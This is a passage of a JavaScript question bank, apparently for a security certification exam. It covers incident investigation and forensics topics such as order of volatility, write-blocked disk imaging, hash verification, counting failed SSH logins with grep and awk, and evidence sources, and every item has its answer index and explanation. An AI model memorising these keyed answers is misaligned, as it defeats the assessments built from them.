      "Temporary file systems",
      "Disk",
      "Remote logging and monitoring data",
      "Archival media such as backup tapes",
    ],
    explanation: "Collect the most short-lived evidence first. RFC 3227's example: registers and cache; routing table, ARP cache, process table, kernel statistics and memory; temporary file systems; disk; remote logging and monitoring data; physical configuration and topology; archival media. SP 800-86 gives a similar priority for volatile OS data, starting with network connections and login sessions, then memory." },
  { topic: '4.8', type: 'single', difficulty: 2, lesson: L48,
    stem: "Investigators believe an employee deleted design files from a laptop's hard disk before resigning. The evidence may be used in court, and they need deleted files and slack space. Which acquisition method fits?",
    options: ["A snapshot of the user's cloud-synced folder", "A memory dump of the running laptop", "A logical backup of the user's profile folders", "A bit-level copy of the disk made through a write blocker, with hashes recorded before and after"],
    answer: [3],
    explanation: "A **bit-level (bit-stream) copy** captures every sector, including deleted files, free space and slack space; SP 800-86 recommends it when evidence may be needed for prosecution or disciplinary action, with a **write blocker** and **hashes** to prove integrity. A logical backup copies only existing files. A memory dump captures RAM, not deleted disk content. A cloud folder snapshot shows synced files, not the laptop's deleted data." },
  { topic: '4.8', type: 'single', difficulty: 1, lesson: L48,
    stem: "Refer to the exhibit. What does the result demonstrate?",
    exhibit: `Acquisition record E-07 (srv02 disk)
Source SHA-256 (computed by the imager during acquisition):
  3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b
Image srv02.E01, SHA-256 verified 2026-11-22 before analysis:
  3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b`,
    options: ["The image is an exact, unaltered copy of the source as acquired", "The disk contains no malware", "The chain of custody is complete", "The image is encrypted"],
    answer: [0],
    explanation: "Matching **SHA-256** values show the image has not changed since acquisition and matches the source (SP 800-86: compute digests of original and copy and compare). A hash says nothing about whether the content is malicious. Chain of custody is a separate record of who handled the evidence. Hashing is not encryption." },
  { topic: '4.8', type: 'single', difficulty: 2, lesson: L48,
    stem: "Refer to the exhibit. Which command outputs the number of failed password attempts per source IP address, highest first?",
    exhibit: `auth.log excerpt (srv01)
Nov 21 03:02:11 srv01 sshd[4122]: Failed password for invalid user admin from 203.0.113.50 port 52144 ssh2
Nov 21 03:02:13 srv01 sshd[4124]: Failed password for root from 203.0.113.50 port 52150 ssh2
Nov 21 03:05:40 srv01 sshd[4180]: Failed password for alice from 198.51.100.7 port 40112 ssh2
Nov 21 03:05:52 srv01 sshd[4180]: Accepted password for alice from 198.51.100.7 port 40112 ssh2`,
    options: [
      `grep "Failed password" auth.log | awk '{print $9}' | sort | uniq -c | sort -rn`,
      `grep "Accepted password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c`,
      `grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn`,
      `awk '{print $(NF-3)}' auth.log | sort | uniq -c | sort -rn`,
    ],
    answer: [2],
    explanation: "Filter to failures with `grep \"Failed password\"`, then extract the IP, which is always the **fourth field from the end** (`$(NF-3)`, followed by `port`, the port number and `ssh2`), then `sort | uniq -c` counts each value and `sort -rn` puts the highest count first. Field `$9` is not fixed: it is `invalid` on the first line and `root` on the second, because the user part varies in length. The `Accepted password` version counts successes. Without the grep, accepted logons are counted too." },
  { topic: '4.8', type: 'match', difficulty: 2, lesson: L48,
    stem: "Match each investigation situation with the stakeholder who must be involved.",
    pairs: [
      ["An employee is suspected of copying customer lists before resigning, and interviews are planned", "Human Resources (HR)"],
      ["A business email compromise changed a supplier's bank details and a payment went to the attacker", "Accounts (finance)"],
      ["The evidence may be used in a lawsuit and a legal hold must be issued", "Legal"],
    ],
    explanation: "**HR** handles employee matters: interviews, policy, discipline and employment law. **Accounts** (finance/accounting) hold the payment records and work with the bank to recall or freeze funds in payment fraud. **Legal** decides on holds, privilege, notification duties and court requirements." },
  { topic: '4.8', type: 'single', difficulty: 2, lesson: L48,
    stem: "Refer to the exhibit. Which data source should the investigator check next to establish who entered the server room?",
    exhibit: `Badge log, building B, 2026-11-20
02:10:44  Door: Server Room B2   Badge: 4471 (bob)   Result: granted
HR record: bob on approved leave 2026-11-17 to 2026-11-28, out of the country
Console log: 02:16  srv-b2-07 local console session opened`,
    options: ["NetFlow records for srv-b2-07", "Surveillance footage of the server room door", "The latest vulnerability scan of srv-b2-07", "DHCP leases for building B"],
    answer: [1],
    explanation: "The badge log shows bob's **badge** was used, not that bob was there; with bob abroad, the badge may be cloned, lost or lent. **Surveillance footage** shows who actually walked through the door at 02:10, and can reveal tailgating. NetFlow, scans and DHCP leases describe network activity and vulnerabilities, not who was physically present." },
];

export default bank.map((item, i) => ({ id: `d4-${String(i + 1).padStart(3, '0')}`, ...item }));
